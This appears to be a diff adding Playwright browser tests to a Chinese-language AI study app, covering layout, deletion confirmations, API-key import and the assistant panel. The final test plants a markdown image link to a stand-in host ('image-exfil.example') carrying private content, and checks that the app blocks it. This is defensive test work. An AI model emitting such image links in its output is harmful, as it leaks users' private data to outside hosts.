@@ -31,6 +31,348 @@ const pages = [
   ["/models", "模型设置"],
 ];
 
+for (const width of [1024, 1440, 1920]) {
+  for (const theme of ["light", "dark"]) {
+    test(`sidebar collapses for focused study at ${width}px in ${theme}`, async ({
+      page,
+    }, testInfo) => {
+      await page.setViewportSize({ width, height: 960 });
+      await page.addInitScript(
+        (theme) => localStorage.setItem("learn.theme", theme),
+        theme,
+      );
+      await mock(page);
+      await page.goto("/study?project=1&chapter=12");
+      const sidebar = page.locator("#primary-nav");
+      const collapse = page.getByRole("button", {
+        name: "收起侧栏",
+        exact: true,
+      });
+      const expand = page.getByRole("button", {
+        name: "展开侧栏",
+        exact: true,
+      });
+      await expect(collapse).toBeVisible();
+      const before = (await page.getByRole("main").boundingBox())!;
+      // A layout toggle must keep the selected tab and unsaved input intact.
+      await page.getByRole("tab", { name: "笔记", exact: true }).click();
+      const textbox = page.getByRole("textbox", {
+        name: "记下你的理解",
+        exact: true,
+      });
+      await textbox.fill("收起菜单时保留的笔记草稿");
+      await collapse.click();
+      await expect(sidebar).toBeHidden();
+      await expect(expand).toBeFocused();
+      await expect(expand).toHaveAttribute("aria-expanded", "false");
+      await expect(
+        page.getByRole("tab", { name: "笔记", exact: true }),
+      ).toHaveAttribute("aria-selected", "true");
+      await expect(textbox).toHaveValue("收起菜单时保留的笔记草稿");
+      const after = (await page.getByRole("main").boundingBox())!;
+      expect(after.width).toBeGreaterThan(before.width);
+      expect(after.x).toBe(0);
+      expect(after.width).toBe(width);
+      await expect(page).toHaveURL(/chapter=12/);
+      await page.screenshot({ path: testInfo.outputPath("focused-study.png") });
+      await textbox.fill("");
+      await page.reload();
+      await expect(sidebar).toBeHidden();
+      await expect(expand).toBeVisible();
+      await expand.focus();
+      await page.keyboard.press("Enter");
+      await expect(sidebar).toBeVisible();
+      await expect(collapse).toBeFocused();
+      await expect(collapse).toHaveAttribute("aria-expanded", "true");
+      expect(
+        await page.evaluate(
+          () => document.documentElement.scrollWidth <= innerWidth,
+        ),
+      ).toBe(true);
+      await page.screenshot({
+        path: testInfo.outputPath("sidebar-restored.png"),
+      });
+    });
+  }
+}
+
+test("collapsed desktop preference keeps mobile navigation usable", async ({
+  page,
+}) => {
+  await page.setViewportSize({ width: 1440, height: 960 });
+  await mock(page);
+  await page.goto("/study?project=1&chapter=12");
+  await page.getByRole("button", { name: "收起侧栏", exact: true }).click();
+  await page.setViewportSize({ width: 390, height: 844 });
+  const sidebar = page.locator("#primary-nav");
+  await expect(sidebar).toHaveAttribute("inert", "");
+  await page.getByRole("button", { name: "打开导航", exact: true }).click();
+  await expect(sidebar).not.toHaveAttribute("inert", "");
+  await expect(
+    page.getByRole("link", { name: "学习首页", exact: true }),
+  ).toBeVisible();
+  await page.getByRole("button", { name: "收起侧栏", exact: true }).click();
+  await expect(sidebar).toHaveAttribute("inert", "");
+  await expect(
+    page.getByRole("button", { name: "打开导航", exact: true }),
+  ).toBeFocused();
+  await page.getByRole("button", { name: "打开导航", exact: true }).click();
+  await page.getByRole("link", { name: "学习工作台", exact: true }).click();
+  await expect(page).toHaveURL(/\/study$/);
+  await expect(sidebar).toHaveAttribute("inert", "");
+  await page.setViewportSize({ width: 1440, height: 960 });
+  await expect(sidebar).toBeHidden();
+  await page.getByRole("button", { name: "展开侧栏", exact: true }).click();
+  await expect(sidebar).toBeVisible();
+});
+
+test("sidebar toggle works when preference storage is unavailable", async ({
+  page,
+}) => {
+  await mock(page);
+  await page.addInitScript(() => {
+    const original = Storage.prototype.setItem;
+    Storage.prototype.setItem = function (key, value) {
+      if (key === "learn.sidebar.collapsed")
+        throw new DOMException("Storage blocked", "SecurityError");
+      original.call(this, key, value);
+    };
+  });
+  await page.goto("/study");
+  await page.getByRole("button", { name: "收起侧栏", exact: true }).click();
+  await expect(page.locator("#primary-nav")).toBeHidden();
+  await page.getByRole("button", { name: "展开侧栏", exact: true }).click();
+  await expect(page.locator("#primary-nav")).toBeVisible();
+});
+
+for (const width of [390, 1440]) {
+  for (const theme of ["light", "dark"]) {
+    test(`pages retain normal layouts without a plan at ${width}px in ${theme}`, async ({
+      page,
+    }, testInfo) => {
+      await page.setViewportSize({ width, height: 960 });
+      await mock(page, true);
+      const requests: string[] = [];
+      page.on("request", (r) => {
+        if (r.url().includes("/api/v2/")) requests.push(r.url());
+      });
+      await page.goto("/chat");
+      if (theme === "dark")
+        await page.getByRole("button", { name: "切换深色主题" }).click();
+      const main = page.getByRole("main");
+      async function check(path: string) {
+        await expect(
+          main.getByRole("link", { name: "添加学习计划" }),
+        ).toHaveCount(0);
+        await expect(
+          main.getByRole("button", { name: "添加学习计划" }),
+        ).toHaveCount(0);
+        await expect(main.getByRole("alert")).toHaveCount(0);
+        expect(
+          await page.evaluate(
+            () => document.documentElement.scrollWidth <= innerWidth + 1,
+          ),
+        ).toBe(true);
+        await page.screenshot({
+          path: testInfo.outputPath(`${path}.png`),
+          fullPage: true,
+        });
+      }
+      await expect(main.locator(".chat-panel")).toBeVisible();
+      await expect(
+        page.getByRole("textbox", { name: "向助教提问" }),
+      ).toBeDisabled();
+      await expect(
+        main.getByRole("button", { name: "发送", exact: true }),
+      ).toBeDisabled();
+      await check("chat-empty");
+      await page.goto("/library");
+      await expect(
+        main.getByRole("heading", { name: "我的资料", exact: true }),
+      ).toBeVisible();
+      await expect(
+        page.getByRole("searchbox", { name: "搜索资料" }),
+      ).toBeEnabled();
+      await page
+        .getByRole("combobox", { name: "资料类型", exact: true })
+        .click();
+      await page.getByRole("option", { name: "PDF", exact: true }).click();
+      await expect(
+        main.getByRole("button", { name: "上传资料", exact: true }),
+      ).toBeDisabled();
+      await check("library-empty");
+      await page.goto("/dashboard");
+      await expect(main.locator(".stat-card")).toHaveCount(3);
+      await expect(
+        main.getByRole("heading", { name: "学习趋势", exact: true }),
+      ).toBeVisible();
+      await expect(
+        main.getByRole("heading", { name: "学习记录", exact: true }),
+      ).toBeVisible();
+      await expect(
+        main.getByRole("button", { name: "整理今日报告", exact: true }),
+      ).toBeDisabled();
+      await check("dashboard-empty");
+      await page.goto("/tools");
+      await expect(
+        main.getByRole("combobox", { name: "练习章节", exact: true }),
+      ).toBeDisabled();
+      await expect(main.locator(".chat-panel")).toBeVisible();
+      await check("coach-empty");
+      await main.getByRole("button", { name: /文本润色 保留原意/ }).click();
+      await expect(
+        main.getByRole("textbox", { name: "原文", exact: true }),
+      ).toBeDisabled();
+      await expect(
+        main.getByRole("button", { name: "开始润色", exact: true }),
+      ).toBeDisabled();
+      await check("polish-empty");
+      expect(requests.some((url) => /\/projects\/0\b/.test(url))).toBe(false);
+    });
+  }
+}
+
+for (const width of [390, 1440]) {
+  test(`learning plan deletion requires confirmation and persists at ${width}px`, async ({
+    page,
+  }) => {
+    await page.setViewportSize({ width, height: 960 });
+    await mock(page);
+    await page.goto("/");
+    const name = "删除学习计划：Python 从入门到实践";
+    let deletes = 0;
+    page.on("request", (r) => {
+      if (r.method() === "DELETE") deletes++;
+    });
+    await page.getByRole("button", { name, exact: true }).click();
+    const dialog = page.getByRole("dialog", {
+      name: "删除学习计划",
+      exact: true,
+    });
+    await expect(dialog).toContainText("资料库中的原始文件保留");
+    await dialog.getByRole("button", { name: "取消", exact: true }).click();
+    expect(deletes).toBe(0);
+    await expect(page).toHaveURL("/");
+    await page.getByRole("button", { name, exact: true }).click();
+    await dialog.getByRole("button", { name: "确认删除", exact: true }).click();
+    await expect(page).toHaveURL("/study");
+    await expect(page.locator(".project-card")).toHaveCount(1);
+    await expect(
+      page.getByRole("heading", { name: "读懂设计的基本语言" }),
+    ).toBeVisible();
+    expect(deletes).toBe(1);
+    await page.reload();
+    await expect(page.locator(".project-card")).toHaveCount(1);
+    await page
+      .getByRole("button", {
+        name: "删除学习计划：读懂设计的基本语言",
+        exact: true,
+      })
+      .click();
+    await dialog.getByRole("button", { name: "确认删除", exact: true }).click();
+    await expect(
+      page.getByRole("heading", { name: "暂无学习计划" }),
+    ).toBeVisible();
+  });
+
+  test(`roadmap deletion retains the plan and permits generation at ${width}px`, async ({
+    page,
+  }) => {
+    await page.setViewportSize({ width, height: 960 });
+    await mock(page);
+    await page.goto("/roadmap?project=1");
+    if (width === 1440)
+      await page.getByRole("button", { name: "切换深色主题" }).click();
+    await page.getByRole("button", { name: "生成周计划", exact: true }).click();
+    await expect(page.locator(".week-card")).toHaveCount(8);
+    await page
+      .getByRole("button", {
+        name: "删除学习路线：Python 从入门到实践",
+        exact: true,
+      })
+      .click();
+    const dialog = page.getByRole("dialog", {
+      name: "删除学习路线",
+      exact: true,
+    });
+    await expect(dialog).toContainText("学习计划、目标和资料库保留");
+    await dialog.getByRole("button", { name: "确认删除", exact: true }).click();
+    await expect(dialog).toHaveCount(0);
+    await expect(page.locator(".roadmap-list li")).toHaveCount(0);
+    await expect(page.locator(".week-card")).toHaveCount(0);
+    await expect(
+      page.getByRole("button", { name: "AI 生成学习路线", exact: true }),
+    ).toBeEnabled();
+    await page.reload();
+    await expect(page.locator(".roadmap-list li")).toHaveCount(0);
+    await page.goto("/study");
+    await expect(page.locator(".project-card")).toHaveCount(2);
+    await page.goto("/library?project=1");
+    await expect(page.locator(".file-row")).toHaveCount(2);
+  });
+}
+
+test("roadmap deletion keeps content and dialog when a task is running", async ({
+  page,
+}) => {
+  await mock(page);
+  let calls = 0;
+  await page.route("**/api/v2/projects/1/roadmap", (route) => {
+    calls++;
+    return route.fulfill({
+      status: 409,
+      json: { error: { code: "JOB_RUNNING", message: "请等待任务完成" } },
+    });
+  });
+  await page.goto("/roadmap?project=1");
+  await page
+    .getByRole("button", {
+      name: "删除学习路线：Python 从入门到实践",
+      exact: true,
+    })
+    .click();
+  const dialog = page.getByRole("dialog", {
+    name: "删除学习路线",
+    exact: true,
+  });
+  await dialog.getByRole("button", { name: "确认删除", exact: true }).click();
+  await expect(dialog.getByRole("alert")).toContainText("请等待任务完成");
+  await expect(page.locator(".roadmap-list li")).toHaveCount(3);
+  expect(calls).toBe(1);
+  await dialog.getByRole("button", { name: "取消", exact: true }).click();
+});
+
+test("roadmap deletion prevents repeat requests after a lost response", async ({
+  page,
+}) => {
+  await mock(page);
+  let calls = 0;
+  await page.route("**/api/v2/projects/1/roadmap", (route) => {
+    calls++;
+    return route.abort("failed");
+  });
+  await page.goto("/roadmap?project=1");
+  await page
+    .getByRole("button", {
+      name: "删除学习路线：Python 从入门到实践",
+      exact: true,
+    })
+    .click();
+  const dialog = page.getByRole("dialog", {
+    name: "删除学习路线",
+    exact: true,
+  });
+  await dialog.getByRole("button", { name: "确认删除", exact: true }).click();
+  await expect(
+    dialog.getByRole("button", { name: "刷新核对结果" }),
+  ).toBeVisible();
+  await expect(
+    dialog.getByRole("button", { name: "确认删除", exact: true }),
+  ).toBeDisabled();
+  expect(calls).toBe(1);
+  await expect(page.locator(".roadmap-list li")).toHaveCount(3);
+});
+
 for (const width of [390, 1440]) {
   test(`batch deletion confirms the full selection and preserves its result at ${width}px`, async ({
     page,
@@ -1325,6 +1667,11 @@ test("model settings show the gateway catalog empty state without a credential f
   page,
 }) => {
   await mock(page);
+  await page.route("**/api/v2/models", (route) =>
+    route.fulfill({
+      json: { items: [], selectedModel: "", selectedAvailable: false },
+    }),
+  );
   await page.goto("/models");
   await expect(
     page.getByRole("heading", { name: "暂无可用模型" }),
@@ -2028,7 +2375,244 @@ test("gateway mode restores supplier cards without accepting a personal key", as
   ).toBeDisabled();
 });
 
-test("local supplier verifies once, keeps the key out of storage and preserves the current main model until saved", async ({
+for (const width of [390, 1440]) {
+  for (const theme of ["light", "dark"]) {
+    test(`personal key import selects, reloads and removes owned models at ${width}px in ${theme}`, async ({
+      page,
+    }, testInfo) => {
+      await page.setViewportSize({ width, height: 960 });
+      await page.addInitScript(
+        (theme) => localStorage.setItem("learn.theme", theme),
+        theme,
+      );
+      await mock(page);
+      let connection:
+        | {
+            id: string;
+            provider: string;
+            name: string;
+            baseUrl: string;
+            models: string[];
+          }
+        | undefined;
+      let selectedModel = "";
+      let fail = true;
+      const ids: string[] = [];
+      await page.route("**/api/v2/models", (route) =>
+        route.fulfill({
+          json: {
+            items: connection
+              ? connection.models.map((id) => ({
+                  id,
+                  provider: connection!.id,
+                }))
+              : [],
+            selectedModel,
+            selectedAvailable: !!selectedModel,
+            source: "personal",
+            providerImportEnabled: true,
+          },
+        }),
+      );
+      await page.route("**/api/v2/model-providers", async (route) => {
+        if (route.request().method() === "GET")
+          return route.fulfill({
+            json: {
+              enabled: true,
+              connections: connection ? [connection] : [],
+            },
+          });
+        const input = route.request().postDataJSON();
+        expect(input.apiKey).toBe("test-personal-key");
+        ids.push(input.id);
+        if (fail)
+          return route.fulfill({
+            status: 422,
+            json: {
+              error: {
+                code: "PROVIDER_KEY_INVALID",
+                message: "API Key 无效，请检查后重新导入。",
+              },
+            },
+          });
+        connection = {
+          id: input.id,
+          provider: input.provider,
+          name: input.name,
+          baseUrl: input.baseUrl,
+          models: [`personal.${input.id}.qwen-test`],
+        };
+        return route.fulfill({ json: { connection, verifiedMs: 320 } });
+      });
+      await page.route("**/api/v2/models/selection", (route) => {
+        selectedModel = route.request().postDataJSON().model;
+        return route.fulfill({ json: { selectedModel } });
+      });
+      await page.route("**/api/v2/model-providers/*", (route) => {
+        expect(route.request().method()).toBe("DELETE");
+        connection = undefined;
+        selectedModel = "";
+        return route.fulfill({ status: 204 });
+      });
+      await page.goto("/models");
+      await expect(page.locator(".primary-model-summary")).toContainText(
+        "尚未设置主模型",
+      );
+      await expect(
+        page.getByText("deepseek-v4.1-flash-1017", { exact: true }),
+      ).toHaveCount(0);
+      await page
+        .getByRole("button", { name: "自定义添加新模型", exact: true })
+        .click();
+      const dialog = page.getByRole("dialog", { name: "添加新供应商" });
+      await expect(page.getByLabel("API Key", { exact: true })).toBeEnabled();
+      await page
+        .getByLabel("供应商名称", { exact: true })
+        .fill("我的个人供应商");
+      await page
+        .getByLabel("API 地址", { exact: true })
+        .fill("https://api.provider.test/v1");
+      await page.getByLabel("模型 ID", { exact: true }).fill("qwen-test");
+      await page
+        .getByLabel("API Key", { exact: true })
+        .fill("test-personal-key");
+      await page.screenshot({
+        path: testInfo.outputPath("personal-import.png"),
+      });
+      await dialog
+        .getByRole("button", { name: "验证并添加", exact: true })
+        .click();
+      await expect(dialog.getByRole("alert")).toContainText("Key 无效");
+      fail = false;
+      await dialog
+        .getByRole("button", { name: "验证并添加", exact: true })
+        .click();
+      await expect(dialog).toHaveCount(0);
+      expect(ids).toHaveLength(2);
+      expect(ids[0]).toBe(ids[1]);
+      await expect(page.locator(".primary-model-summary")).toContainText(
+        "尚未设置主模型",
+      );
+      await page
+        .getByRole("button", { name: "设为主模型", exact: true })
+        .click();
+      await expect(page.locator(".primary-model-summary")).toContainText(
+        "qwen-test",
+      );
+      await page.reload();
+      await expect(page.locator(".primary-model-summary")).toContainText(
+        "qwen-test",
+      );
+      expect(
+        await page.evaluate(() =>
+          JSON.stringify({
+            local: { ...localStorage },
+            session: { ...sessionStorage },
+          }),
+        ),
+      ).not.toContain("test-personal-key");
+      await page.getByRole("button", { name: /我的个人供应商/ }).click();
+      await page
+        .getByRole("button", { name: "移除当前供应商", exact: true })
+        .click();
+      await page.getByRole("button", { name: "确认移除", exact: true }).click();
+      await expect(page.locator(".primary-model-summary")).toContainText(
+        "尚未设置主模型",
+      );
+      await expect
+        .poll(() =>
+          page.evaluate(
+            () => document.documentElement.scrollWidth <= innerWidth,
+          ),
+        )
+        .toBe(true);
+    });
+  }
+}
+
+test("missing personal key explains the problem and links to import without discarding the goal", async ({
+  page,
+}) => {
+  await mock(page, true);
+  await page.route("**/api/v2/projects", (route) =>
+    route.request().method() === "POST"
+      ? route.fulfill({
+          status: 422,
+          json: {
+            error: {
+              code: "MODEL_NOT_CONFIGURED",
+              message: "请先导入 API Key，并选择主模型。",
+            },
+          },
+        })
+      : route.fallback(),
+  );
+  await page.goto("/");
+  await page.getByLabel("学习目标", { exact: true }).fill("学习数学分析");
+  await page.getByRole("button", { name: "创建学习计划", exact: true }).click();
+  await expect(page.getByRole("alert")).toContainText("请先导入 API Key");
+  await expect(page.getByRole("alert")).not.toContainText("内容已更新");
+  await expect(page.getByLabel("学习目标", { exact: true })).toHaveValue(
+    "学习数学分析",
+  );
+  await page.getByRole("link", { name: "导入 API Key", exact: true }).click();
+  await expect(page).toHaveURL(/\/models$/);
+});
+
+test("lesson generation shows estimates, survives reload and only completes after saving", async ({
+  page,
+}) => {
+  await mock(page);
+  let state = "running";
+  let phase = "generating";
+  const start = new Date().toISOString();
+  await page.route("**/lesson-jobs", (route) =>
+    route.fulfill({
+      status: 202,
+      json: { jobId: "test-lesson-progress", state },
+    }),
+  );
+  await page.route("**/jobs/test-lesson-progress/events?*", (route) =>
+    route.abort(),
+  );
+  await page.route("**/jobs/test-lesson-progress", (route) =>
+    route.fulfill({
+      json: {
+        jobId: "test-lesson-progress",
+        kind: "lesson",
+        subject: "node:13",
+        state,
+        progress: {
+          phase,
+          attemptStartedAt: start,
+          estimatedModelMs: 60000,
+          estimateSource: "history",
+          queueMs: 50,
+          modelMs: 1200,
+          totalMs: 1300,
+        },
+        error: null,
+        updatedAt: start,
+      },
+    }),
+  );
+  await page.goto("/study?project=1&chapter=13");
+  await page.getByRole("button", { name: "生成本节教材", exact: true }).click();
+  const bar = page.getByRole("progressbar", { name: "学习内容生成进度" });
+  await expect(bar).toBeVisible();
+  await expect(page.locator(".generation-progress")).toContainText(
+    "正在编写本节教材",
+  );
+  expect(Number(await bar.getAttribute("aria-valuenow"))).toBeLessThan(100);
+  await page.reload();
+  await expect(bar).toBeVisible();
+  phase = "saving";
+  await expect(bar).toHaveAttribute("aria-valuenow", "96");
+  state = "done";
+  await expect(bar).toHaveAttribute("aria-valuenow", "100");
+});
+
+test("local supplier bridge follows the development or production boundary", async ({
   page,
 }) => {
   await mock(page);
@@ -2042,11 +2626,13 @@ test("local supplier verifies once, keeps the key out of storage and preserves t
     models: [alias],
   };
   let added = false;
+  let localReads = 0;
   let requests = 0;
   let fail = true;
   let selectedModel = "deepseek-test";
   await page.route("**/api/v2/local-providers", async (route) => {
     if (route.request().method() === "GET") {
+      localReads++;
       await route.fulfill({
         json: { enabled: true, connections: added ? [connection] : [] },
       });
@@ -2087,6 +2673,20 @@ test("local supplier verifies once, keeps the key out of storage and preserves t
     return route.fulfill({ json: { selectedModel } });
   });
   await page.goto("/models");
+  if (process.env.LEARN_WEB_TEST_PREVIEW === "1") {
+    // The legacy in-memory bridge is intentionally compiled out of releases.
+    // A mocked endpoint must not make a production gateway page accept a Key.
+    await page
+      .getByRole("button", { name: "自定义添加新模型", exact: true })
+      .click();
+    await expect(page.getByLabel("API Key", { exact: true })).toBeDisabled();
+    await expect(
+      page.getByRole("button", { name: "由官网网关管理", exact: true }),
+    ).toBeDisabled();
+    expect(localReads).toBe(0);
+    expect(requests).toBe(0);
+    return;
+  }
   await expect(
     page.getByText("本机测试供应商 · 生成内容会消耗对应供应商额度。", {
       exact: true,
@@ -2130,4 +2730,156 @@ test("local supplier verifies once, keeps the key out of storage and preserves t
     ),
   ).not.toContain("test-only-key");
   expect(requests).toBe(2);
+});
+
+for (const width of [390, 1440]) {
+  for (const theme of ["light", "dark"]) {
+    test(`persistent assistant keeps drafts across pages at ${width}px in ${theme}`, async ({
+      page,
+    }, testInfo) => {
+      await page.setViewportSize({ width, height: 960 });
+      await page.addInitScript(
+        (theme) => localStorage.setItem("learn.theme", theme),
+        theme,
+      );
+      await mock(page);
+      await page.goto("/study?project=1&chapter=12");
+      await expect(
+        page.getByRole("navigation", { name: "主导航" }).getByRole("link"),
+      ).toHaveText([
+        "学习首页",
+        "学习路线",
+        "学习工作台",
+        "间隔复习",
+        "查漏测验",
+        "学习看板",
+        "知识问答",
+        "资料库",
+        "学习工具",
+        "模型设置",
+      ]);
+      await page
+        .getByRole("button", { name: "打开以太小助", exact: true })
+        .click();
+      const assistant = page.getByRole("dialog", {
+        name: "以太小助",
+        exact: true,
+      });
+      await expect(assistant).toBeVisible();
+      const input = assistant.getByRole("textbox", { name: "向以太小助提问" });
+      await input.fill("跨页保存的小助草稿");
+      if (width < 850)
+        await assistant.getByRole("button", { name: "关闭以太小助" }).click();
+      if (width < 850)
+        await page
+          .getByRole("button", { name: "打开导航", exact: true })
+          .click();
+      await page
+        .getByRole("navigation", { name: "主导航" })
+        .getByRole("link", { name: "资料库", exact: true })
+        .click();
+      if (width < 850)
+        await page
+          .getByRole("button", { name: "打开以太小助", exact: true })
+          .click();
+      await expect(input).toHaveValue("跨页保存的小助草稿");
+      await expect(assistant.locator(".assistant-context")).toContainText(
+        "资料库",
+      );
+      await input.press("Enter");
+      await expect(
+        assistant.getByText("这是以太小助的本地演示回答。", { exact: false }),
+      ).toBeVisible();
+      await expect(input).toHaveValue("");
+      await page.screenshot({ path: testInfo.outputPath("assistant.png") });
+      await assistant
+        .getByRole("button", { name: "清空对话", exact: true })
+        .click();
+      await page
+        .getByRole("dialog", { name: "清空小助对话？", exact: true })
+        .getByRole("button", { name: "确认清空", exact: true })
+        .click();
+      await expect(
+        assistant.getByText("这是以太小助的本地演示回答。", { exact: false }),
+      ).toHaveCount(0);
+      await page.keyboard.press("Escape");
+      await expect(assistant).toBeHidden();
+      await expect(
+        page.getByRole("button", { name: "打开以太小助", exact: true }),
+      ).toBeFocused();
+    });
+  }
+}
+
+test("study minutes are recorded only after a full minute on a visible lesson", async ({
+  page,
+}) => {
+  await mock(page);
+  let minutes = 0;
+  await page.route("**/api/v2/projects/1/progress", async (route) => {
+    const body = route.request().postDataJSON();
+    expect(body.metric).toBe("minutes");
+    expect(body.value).toBe(1);
+    expect(body.nodeId).toBe(12);
+    minutes++;
+    await route.fulfill({
+      status: 201,
+      contentType: "application/json",
+      body: "{}",
+    });
+  });
+  await page.clock.install();
+  await page.goto("/study?project=1&chapter=12");
+  await expect(
+    page.getByRole("heading", { name: "变量，让信息有个名字", exact: true }),
+  ).toBeVisible();
+  await page.clock.fastForward(59_000);
+  expect(minutes).toBe(0);
+  await page.clock.fastForward(1_100);
+  await expect.poll(() => minutes).toBe(1);
+  await page.getByRole("link", { name: "返回章节目录", exact: true }).click();
+  await page.clock.fastForward(120_000);
+  expect(minutes).toBe(1);
+});
+
+test("new users see model setup before creating a paid plan", async ({
+  page,
+}) => {
+  await mock(page);
+  await page.route("**/api/v2/models", (route) =>
+    route.fulfill({
+      json: { items: [], selectedModel: "", selectedAvailable: false },
+    }),
+  );
+  await page.goto("/");
+  await expect(
+    page.getByRole("alert").filter({ hasText: "请先到「模型设置」选择主模型" }),
+  ).toBeVisible();
+  await page.getByRole("link", { name: "前往模型设置", exact: true }).click();
+  await expect(page).toHaveURL(/\/models/);
+});
+
+test("model markdown blocks external image requests while retaining data images", async ({
+  page,
+}) => {
+  const demo = await mock(page);
+  let leaked = false;
+  page.on("request", (request) => {
+    if (request.url().includes("image-exfil.example")) leaked = true;
+  });
+  await page.route("**/api/v2/projects/1/nodes", async (route) => {
+    const response = await demo.handle(route.request().url());
+    const payload = await response.json();
+    payload.items.find((n: { id: number }) => n.id === 12).description =
+      "## 图片\n\n![外部图片](https://image-exfil.example/?private=content)\n\n![本地数据图片](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+jEeUAAAAASUVORK5CYII=)";
+    await route.fulfill({ json: payload });
+  });
+  await page.goto("/study?project=1&chapter=12");
+  await expect(
+    page.getByText("[外部图片已屏蔽]", { exact: false }),
+  ).toBeVisible();
+  await expect(
+    page.getByRole("img", { name: "本地数据图片", exact: true }),
+  ).toBeVisible();
+  expect(leaked).toBe(false);
 });
